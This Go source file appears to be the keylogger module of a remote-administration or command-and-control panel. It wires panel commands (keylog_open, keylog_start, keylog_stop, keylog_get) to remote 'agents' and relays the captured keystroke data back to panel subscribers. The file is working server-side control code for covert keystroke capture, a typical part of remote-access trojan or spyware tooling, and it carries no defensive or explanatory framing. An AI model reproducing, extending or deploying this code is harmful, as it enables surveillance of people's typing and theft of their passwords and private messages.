package keylog

import (
	"encoding/json"

	"agentmanager/modules/panelapp"
)

type Service struct {
	app *panelapp.App
}

func NewService(app *panelapp.App) *Service {
	s := &Service{app: app}
	app.Panel.RegisterHandler("keylog_open", app.Guarded(s.onKeylogOpen))
	app.Panel.RegisterHandler("keylog_close", app.Guarded(s.onKeylogClose))
	app.Panel.RegisterHandler("keylog_start", app.Guarded(s.onKeylogStart))
	app.Panel.RegisterHandler("keylog_stop", app.Guarded(s.onKeylogStop))
	app.Panel.RegisterHandler("keylog_get", app.Guarded(s.onKeylogGet))
	app.Agent.RegisterHandler("keylog_state", s.onKeylogResultType("state"))
	app.Agent.RegisterHandler("keylog_data", s.onKeylogResultType("data"))
	return s
}

func (s *Service) onKeylogOpen(panelConnID string, payload json.RawMessage) {
	s.app.AppOpen(panelConnID, payload, "keylog", "keylog_open", "keylog_refresh")
}

func (s *Service) onKeylogClose(panelConnID string, payload json.RawMessage) {
	s.app.AppClose(panelConnID, payload, "keylog", "keylog_close")
}

func (s *Service) onKeylogStart(_ string, p json.RawMessage) {
	var d struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(p, &d) != nil || d.AgentID == "" {
		return
	}
	for _, conn := range s.app.Reg.ConnsFor(d.AgentID) {
		s.app.Agent.EmitTo(conn, "keylog_start", p)
	}
}

func (s *Service) onKeylogStop(_ string, p json.RawMessage) {
	var d struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(p, &d) != nil || d.AgentID == "" {
		return
	}
	for _, conn := range s.app.Reg.ConnsFor(d.AgentID) {
		s.app.Agent.EmitTo(conn, "keylog_stop", p)
	}
}

func (s *Service) onKeylogGet(_ string, p json.RawMessage) {
	var d struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(p, &d) != nil || d.AgentID == "" {
		return
	}
	for _, conn := range s.app.Reg.ConnsFor(d.AgentID) {
		s.app.Agent.EmitTo(conn, "keylog_get", p)
	}
}

func (s *Service) onKeylogResultType(msgType string) func(string, json.RawMessage) {
	return func(agentConnID string, payload json.RawMessage) {
		id, ok := s.app.Reg.AgentFor(agentConnID)
		if !ok {
			return
		}
		s.app.Publish("keylog:"+id, "keylog_result", map[string]interface{}{
			"t": msgType,
			"d": payload,
		})
	}
}
